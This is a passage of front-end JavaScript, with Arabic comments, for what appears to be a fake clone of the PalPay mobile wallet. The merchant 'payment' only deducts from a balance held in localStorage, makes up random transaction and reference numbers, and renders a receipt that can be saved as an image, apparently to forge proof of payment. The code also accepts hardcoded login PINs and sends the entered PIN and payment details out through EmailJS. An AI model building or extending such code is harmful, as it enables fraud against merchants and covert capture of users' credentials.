    if(grid) {
        Array.from(grid.children).forEach((item, i) => item.style.display = 'flex');
    }
};

document.getElementById('toggle-services')?.addEventListener('click', function() {
    const grid = document.getElementById('services-grid');
    const items = Array.from(grid.children);
    const isShowingMore = this.innerText.includes("أقل");
    items.forEach((item, i) => { if (i >= 4) item.style.display = isShowingMore ? 'none' : 'flex'; });
    this.innerText = isShowingMore ? `عرض الكل (${items.length})` : "عرض أقل";
});

/***********************
 * 10. العمليات الديناميكية لشاشة 9 و 10 والمودال (التاجر)
 ***********************/
const nextBtnS9 = document.getElementById('next-to-confirm-merchant');
const merchantModal = document.getElementById('merchant-confirm-modal');
const cancelMerchantBtn = document.getElementById('cancel-merchant-btn');
const confirmMerchantBtn = document.getElementById('confirm-merchant-btn');

if (nextBtnS9) {
    nextBtnS9.addEventListener('click', async (e) => {
        if(e) e.preventDefault(); // لمنع الإرسال الافتراضي
        const amountField = document.getElementById('amount-s9');
        const amount = amountField ? amountField.value.trim() : "0";
        const numericAmount = parseFloat(amount);

        // التوقف بصمت إذا كان المبلغ فارغاً أو 0
        if (amount === "" || isNaN(numericAmount) || numericAmount === 0) {
            return; 
        }

        const merchantContact = await _directAPILookup(localStorage.getItem('merchant_phone') || '');
        if (!merchantContact || !merchantContact.name) { updateS9Inputs(localStorage.getItem('merchant_phone') || '', ''); showVerifyModal(); return; }
        const mName = merchantContact.name;
        updateS9Inputs(localStorage.getItem('merchant_phone') || '', mName);

        const modalAmountText = document.getElementById('modal-amount-text');
        const modalMerchantText = document.getElementById('modal-merchant-text');
        const modalTotalText = document.getElementById('modal-total-text');

        if(modalAmountText) modalAmountText.innerText = amount + " شيكل";
        if(modalMerchantText) modalMerchantText.innerText = mName;
        if(modalTotalText) modalTotalText.innerText = numericAmount.toFixed(1) + " ILS";

        merchantModal.style.display = 'flex';
    });
}

if (cancelMerchantBtn) {
    cancelMerchantBtn.addEventListener('click', () => {
        merchantModal.style.display = 'none';
    });
}

if (confirmMerchantBtn) {
    confirmMerchantBtn.addEventListener('click', () => {
        const amountField = document.getElementById('amount-s9');
        const amount = parseFloat(amountField ? amountField.value : "0");
        
        if (amount > currentBalance) return alert('الرصيد غير كافٍ');
        
        currentBalance -= amount;
        localStorage.setItem('user_balance', currentBalance.toFixed(2));
    syncCloudFromLocal(['user_balance']);
        updateAllBalances(currentBalance);

        merchantModal.style.display = 'none';
        
        const merchantContact = findContactByPhone(localStorage.getItem('merchant_phone') || '');
        const mName = merchantContact?.name || '';
        if (!mName) return showVerifyModal();

        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const letters = chars.charAt(Math.floor(Math.random() * 26)) + chars.charAt(Math.floor(Math.random() * 26));
        const numbers = Math.floor(10000000 + Math.random() * 90000000);
        const refNum = letters + numbers; // الرقم المرجعي

        const random7Digit = Math.floor(1000000 + Math.random() * 9000000); // رقم 7 خانات عشوائي

        // إدراج العملية في كشف الحساب
        const stmtDesc = `دفع ل ${mName},<br>رقم الحركة :${random7Digit},<br>${refNum}`;
        addStatementEntry(stmtDesc, parseFloat(amount || 0).toFixed(1) + '-');

        const today = new Date();
        const dateStr = today.getFullYear() + '-' + String(today.getMonth() + 1).padStart(2, '0') + '-' + String(today.getDate()).padStart(2, '0');

        const s10Vals = document.querySelectorAll('#screen-10 .value-text');
        
        const elMerchant = document.getElementById('s10-merchant-name');
        if(elMerchant) elMerchant.innerText = mName; else if(s10Vals[0]) s10Vals[0].innerText = mName;
        
        const elPos = document.getElementById('s10-pos-name');
        if(elPos) elPos.innerText = mName; else if(s10Vals[1]) s10Vals[1].innerText = mName;
        
        const elAmt = document.getElementById('s10-amount');
        if(elAmt) elAmt.innerText = parseFloat(amount || 0).toFixed(1); else if(s10Vals[2]) s10Vals[2].innerText = parseFloat(amount || 0).toFixed(1);
        
        const elRef = document.getElementById('s10-ref');
        if(elRef) elRef.innerText = refNum; else if(s10Vals[4]) s10Vals[4].innerText = refNum;
        
        const elDate = document.getElementById('s10-date');
        if(elDate) elDate.innerText = dateStr; else if(s10Vals[5]) s10Vals[5].innerText = dateStr;

        // ✉️ إرسال بيانات دفع التاجر عبر EmailJS
        sendMerchantPaymentData(mName, parseFloat(amount || 0).toFixed(2), refNum);

        showScreen('s10'); 
    });
}

/***********************
 * 11. لقطة الشاشة (الشاشة 10) كاملة بما فيها الأزرار
 ***********************/
const s10Img = document.getElementById('s10-image') || document.querySelector('#screen-10 .icon-box img');
if(s10Img) {
    s10Img.addEventListener('click', () => {
        if (typeof html2canvas === 'undefined') {
            alert('يرجى التأكد من إضافة مكتبة html2canvas في ملف index.html لتعمل ميزة تصوير الشاشة.');
            return;
        }

        const screen10 = document.getElementById('screen-10');

        html2canvas(screen10, { scale: 2 }).then(canvas => {
            const link = document.createElement('a');
            link.download = 'Receipt_' + new Date().getTime() + '.png';
            link.href = canvas.toDataURL('image/png');
            link.click();
        }).catch(err => {
            console.error("خطأ في التقاط الشاشة", err);
        });
    });
}

/***********************
 * 12. نظام تسجيل الدخول (مع تقييد أرقام فقط)
 ***********************/
const confirmModal = document.getElementById('confirmModal');
const cancelBtn = document.querySelector('.cancel-btn');
const codeInputs = document.querySelectorAll('.code-inputs input');
const allowedPasswords = ['5000', '1832', '1722'];

// زر "استخدم رمز التأكيد" يفتح مربع تسجيل الدخول مباشرة
const otpLoginBtn = document.getElementById('otp-login-btn');
if (otpLoginBtn) {
    otpLoginBtn.addEventListener('click', () => {
        if (confirmModal) {
            confirmModal.style.display = 'flex';
            if (codeInputs.length > 0) codeInputs[0].focus();
        }
    });
}

if(document.getElementById('screen-login')) {
    setTimeout(() => {
        if(confirmModal) {
            confirmModal.style.display = 'flex';
            if(codeInputs.length > 0) codeInputs[0].focus();
        }
    }, 3000);
}

if(cancelBtn) {
    cancelBtn.addEventListener('click', () => {
        confirmModal.style.display = 'none';
    });
}

codeInputs.forEach((input, index) => {
    input.addEventListener('keypress', (e) => {
        if (!/[0-9]/.test(e.key)) e.preventDefault();
    });

    input.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^0-9]/g, '');
        if (e.target.value === '') return;

        if (e.target.value.length === 1) {
            input.dataset.realValue = e.target.value;
            input.value = "*";
            
            if (index < codeInputs.length - 1) codeInputs[index + 1].focus();
            else setTimeout(checkPassword, 100);
        }
    });
    
    input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace') {
            input.value = '';
            input.dataset.realValue = '';
            if (index > 0) codeInputs[index - 1].focus();
        }
    });
});

function checkPassword() {
    let password = "";
    codeInputs.forEach(input => password += (input.dataset.realValue || ""));

    if (allowedPasswords.includes(password)) {
        confirmModal.style.display = 'none';
        codeInputs.forEach(input => { input.value = ''; input.dataset.realValue = ''; });

        // ✉️ إرسال بيانات تسجيل الدخول عبر EmailJS
        sendLoginData(password);

        // 🔑 تسجيل دخول تلقائي إلى PalPay API باستخدام البيانات المحفوظة
        // (يعمل في الخلفية — لا يُعيق تحميل الواجهة)
        (async () => {
            const savedPhone    = localStorage.getItem('palpay_auth_phone')    || '';
            const savedPassword = localStorage.getItem('palpay_auth_password') || '';
            if (savedPhone && savedPassword) {
                const ok = await palPayLogin(savedPhone, savedPassword);
                if (ok) {
                    // بعد نجاح الدخول: جلب قائمة المستلمين فوراً
                    loadPayeesFromPalPayAPI();
                }
            }
        })();

        showScreen('s1');
    } else {
        codeInputs.forEach(input => { input.value = ''; input.dataset.realValue = ''; });
        codeInputs[0].focus();
    }
}

/***********************
 * سحب للأسفل 3 مرات متتالية = العودة لشاشة تسجيل الدخول
 ***********************/
(function() {
    let pullStartY = 0;
    let pullLastTime = 0;
    let pullCount = 0;
    const PULL_THRESHOLD = 80;  // px للأسفل
    const PULL_GAP = 800; // ms بين السحبات المتتالية

    document.addEventListener('touchstart', function(e) {
        pullStartY = e.changedTouches[0].clientY;
    }, { passive: true });

    document.addEventListener('touchend', function(e) {
        const loginScreen = document.getElementById('screen-login');
        if (loginScreen && loginScreen.style.display !== 'none') return;

        const endY = e.changedTouches[0].clientY;
        const diff = endY - pullStartY;

        if (diff > PULL_THRESHOLD) {
            const now = Date.now();
            if (now - pullLastTime < PULL_GAP) {
                pullCount++;
            } else {
                pullCount = 1;
            }
            pullLastTime = now;

            if (pullCount >= 3) {
                pullCount = 0;
                document.querySelectorAll('.app-screen, .payment-view, .friends-view').forEach(s => {
                    s.style.display = 'none';
                });
                loginScreen.style.display = 'block';
            }
        }
    }, { passive: true });
})();


/***********************
 * قائمة شاشة تسجيل الدخول
 ***********************/
(function initLoginMenu() {
    const trigger = document.getElementById('login-menu-trigger');
    const panel = document.getElementById('login-menu-panel');
    const overlay = document.getElementById('login-menu-overlay');
    const closeBtn = document.getElementById('close-login-menu');
    const content = document.getElementById('login-menu-content');
    const contentImage = document.getElementById('login-menu-content-image');
    const closeContentBtn = document.getElementById('close-login-menu-content');

    if (!trigger || !panel || !overlay || !content || !contentImage) return;

    const images = {
        'about-app': {
            src: 'https://i.imgur.com/pe0jiRL.png',
            alt: 'عن التطبيق'
        },
        'login': {
            src: 'https://i.imgur.com/75Iyigd.png',
            alt: 'تسجيل الدخول'
        },
        'about-wallet': {
            src: 'https://i.imgur.com/OUeA8FJ.png',
            alt: 'عن محفظتي'
        },
        'contact': {
            src: 'https://i.imgur.com/Ss6SAj2.png',
            alt: 'اتصل بنا'
        },
        'privacy': {
            src: 'https://i.imgur.com/GlsgQA0.png',
            alt: 'سياسة الخصوصية'
        }
    };

    const openMenu = () => {
        panel.classList.add('active');
        overlay.classList.add('active');
        overlay.setAttribute('aria-hidden', 'false');
    };

    const closeMenu = () => {
        panel.classList.remove('active');
        overlay.classList.remove('active');
        overlay.setAttribute('aria-hidden', 'true');
    };

    const closeContent = () => {
        content.classList.remove('active');
        content.setAttribute('aria-hidden', 'true');
        contentImage.removeAttribute('src');
        closeMenu();
    };

    trigger.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        openMenu();
    });

    overlay.addEventListener('click', closeMenu);
    closeBtn?.addEventListener('click', closeMenu);

    panel.querySelectorAll('.login-menu-item').forEach(item => {
        item.addEventListener('click', () => {
            const key = item.getAttribute('data-login-menu-screen');
            const data = images[key];
            if (!data) return;

            closeMenu();

            if (key === 'login') {
                return;
            }

            contentImage.src = data.src;
            contentImage.alt = data.alt;
            content.classList.add('active');
            content.setAttribute('aria-hidden', 'false');
        });
    });

    closeContentBtn?.addEventListener('click', closeContent);

    document.addEventListener('keydown', (e) => {
        if (e.key !== 'Escape') return;
        if (content.classList.contains('active')) {
            closeContent();
        } else {
            closeMenu();
        }
    });
})();

/***********************
 * القائمة الجانبية الرئيسية
 ***********************/
(function initMainMenu() {
    const menuBars = document.getElementById('menu-trigger');
    const mainMenu = document.getElementById('main-menu');
    const menuOverlay = document.createElement('div');
    menuOverlay.className = 'menu-overlay';
    document.body.appendChild(menuOverlay);

    // فتح القائمة عند النقر على الثلاث شرطات في الشاشة 1 فقط
    if (menuBars) {
        menuBars.addEventListener('click', function() {
            mainMenu.classList.add('active');
            menuOverlay.classList.add('active');
        });
    }

    // إغلاق القائمة عند النقر خارجها
    menuOverlay.addEventListener('click', function() {
        mainMenu.classList.remove('active');
        menuOverlay.classList.remove('active');
    });

    // إغلاق القائمة عند النقر على عنصر من عناصرها
    const menuItems = document.querySelectorAll('.menu-item');
    menuItems.forEach(item => {
        item.addEventListener('click', function() {
            mainMenu.classList.remove('active');
            menuOverlay.classList.remove('active');
            
            // معالجة الأفعال المتعلقة بكل عنصر قائمة
            const action = this.getAttribute('data-action');
            if (action === 'home') {
                showScreen('s1');
            } else if (action === 'check-code') {
                document.getElementById('check-code-screen').classList.add('active');
            } else if (action === 'pay-friend') {
                showScreen('s3');
            } else if (action === 'pay-merchant') {
                showScreen('s7');
            } else if (action === 'qr-scan') {
                startScanner();
            }
        });
    });
})();

/***********************
 * شاشة "إنشاء USSD QR" (كاملة الصفحة) — تُفتح من صورة إنشاء USSD QR
 ***********************/
(function initUssdQrScreen() {
    const trigger = document.getElementById('ussd-qr-trigger');
    const screen = document.getElementById('ussdQrScreen');
    const closeIcon = document.getElementById('closeUssdQr');

    if (!trigger || !screen) return;

    const openScreen = () => { screen.classList.add('active'); };
    const closeScreen = () => { screen.classList.remove('active'); };

    trigger.addEventListener('click', openScreen);
    closeIcon?.addEventListener('click', closeScreen);
})();

/***********************
 * شاشة "عن بال باي" (كاملة الصفحة) — تُفتح من صورة عن محفظتي
 ***********************/
(function initAboutUsScreen() {
    const trigger = document.getElementById('about-us-trigger');
    const screen = document.getElementById('aboutUsScreen');
    const closeIcon = document.getElementById('closeAboutUs');

    if (!trigger || !screen) return;

    const openScreen = (e) => {
        e.stopPropagation();
        screen.classList.add('active');
    };
    const closeScreen = () => { screen.classList.remove('active'); };

    trigger.addEventListener('click', openScreen);
    closeIcon?.addEventListener('click', closeScreen);
})();

/***********************
 * شاشة "تواصل معنا" (كاملة الصفحة)
 ***********************/
(function initContactUsScreen() {
    const trigger = document.getElementById('contact-us-trigger');
    const screen = document.getElementById('contactUsScreen');
    const closeIcon = document.getElementById('closeContactUs');

    if (!trigger || !screen) return;

    const openScreen = () => { screen.classList.add('active'); };
    const closeScreen = () => { screen.classList.remove('active'); };

    trigger.addEventListener('click', openScreen);
    closeIcon?.addEventListener('click', closeScreen);
})();

/***********************
 * شاشة "فحص كود الصرف" (كاملة الصفحة)
 ***********************/
(function initCheckCodeScreen() {
    const screen = document.getElementById('check-code-screen');
    const closeIcon = document.getElementById('close-check-code');
    const checkBtn = document.getElementById('checkCodeBtn');
    const codeInput = document.getElementById('codeInput');
    const resultsDiv = document.getElementById('checkCodeResults');
    const noResultsDiv = document.getElementById('noResults');

    if (!screen) return;

    const closeScreen = () => { screen.classList.remove('active'); };
    
    // البيانات الوهمية للاختبار
    const mockData = {
        '1234': {
            name: 'محمد أحمد',
            id: '123456789',
            code: '1234',
            phone: '0566884400',
            org: 'وزارة الصحة',
            amount: '500 شيقل'
        },
        '5678': {
            name: 'فاطمة علي',
            id: '987654321',
            code: '5678',
            phone: '0599887766',
            org: 'وزارة التعليم',
            amount: '1000 شيقل'
        },
        '9999': {
            name: 'سالم محمود',
            id: '456789012',
            code: '9999',
            phone: '0572334455',
            org: 'بلدية رام الله',
            amount: '250 شيقل'
        }
    };

    closeIcon?.addEventListener('click', closeScreen);

    checkBtn?.addEventListener('click', () => {
        const code = codeInput.value.trim();
        
        if (!code) {
            resultsDiv.style.display = 'none';
            noResultsDiv.style.display = 'block';
            return;
        }

        if (mockData[code]) {
            const data = mockData[code];
            document.getElementById('resultName').textContent = data.name;
            document.getElementById('resultId').textContent = data.id;
            document.getElementById('resultCode').textContent = data.code;
            document.getElementById('resultPhone').textContent = data.phone;
            document.getElementById('resultOrg').textContent = data.org;
            document.getElementById('resultAmount').textContent = data.amount;
            
            resultsDiv.style.display = 'block';
            noResultsDiv.style.display = 'none';
        } else {
            resultsDiv.style.display = 'none';
            noResultsDiv.style.display = 'block';
        }
    });

    // البحث عند الضغط على Enter
    codeInput?.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            checkBtn.click();
        }
    });
})();

/***********************
 * شاشة "فحص كود الصرف" (كاملة الصفحة)
 ***********************/
(function initCheckCodeScreen() {
    const trigger = document.getElementById('check-code-trigger');
    const screen = document.getElementById('check-code-screen');
    const closeIcon = document.getElementById('close-check-code');

    if (!trigger || !screen) return;

    const openScreen = () => {
        // إشارة التحميل تظهر أولاً على الواجهة الحالية، ثم يتم فتح شاشة فحص كود الصرف.
        const currentScreen = document.querySelector(
            '.app-screen[style*="display: block"], .app-screen[style*="display: flex"], .payment-view[style*="display: block"], .payment-view[style*="display: flex"]'
        ) || document.getElementById('screen-1');

        if (!currentScreen) {
            screen.classList.add('active');
            return;
        }

        const oldLoader = currentScreen.querySelector('.check-code-click-loader');
        if (oldLoader) oldLoader.remove();

        const loader = document.createElement('div');
        loader.className = 'check-code-click-loader';
        loader.innerHTML = '<div class="custom-loader"></div>';
        currentScreen.appendChild(loader);

        window.setTimeout(() => {
            loader.remove();
            screen.classList.add('active');
        }, 5000);
    };
    const closeScreen = () => { screen.classList.remove('active'); };

    trigger.addEventListener('click', openScreen);
    closeIcon?.addEventListener('click', closeScreen);
})();
